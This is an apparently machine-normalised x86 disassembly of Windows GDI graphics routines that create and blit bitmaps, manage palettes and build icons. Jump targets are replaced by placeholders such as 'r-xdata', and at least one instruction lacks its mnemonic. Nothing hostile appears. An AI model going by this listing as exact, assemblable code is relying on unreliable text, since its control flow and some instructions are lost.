call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41d7f0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41d7f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9fd
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41da08
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41da3c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41d898
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41dcbc
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d898
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcc3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d898
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41db0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_40686c
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcc3
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41dcd0
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41dd08
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b3c
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41dd80
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41ddd8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ded5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dedc
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41def0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41df76
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41df88
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41dd80
mov eax esp
call sub_41def0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e02c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41dd80
mov [ esp ] eax
sub_41e080
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41da28
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41da08
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e22c
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d898
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e152
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41d8a8
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e159
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41d79c
sub_41e159
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41da28
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d898
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e20c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41d8a8
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e213
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e248
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e2d8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079b8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41e5cf
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41e3c1
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41d79c
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3c8
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e3c8
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e23c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_4079b8
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41e5af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e080
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4079b8
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41e58c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e593
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41d7f0
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e23c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e248
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41e5f8
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41d778
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b3c
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41da28
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41e6dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41e5f8
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41e748
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41e5f8
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e7e5
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7ec
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41e81c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b3c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b3c
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41e810
xor edx edx
push ebp
push sub_41ea0a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41e6dc
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41e6dc
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41e9e3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_4079b8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_4079b8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_4079b8
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079b8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41e748
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41e748
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
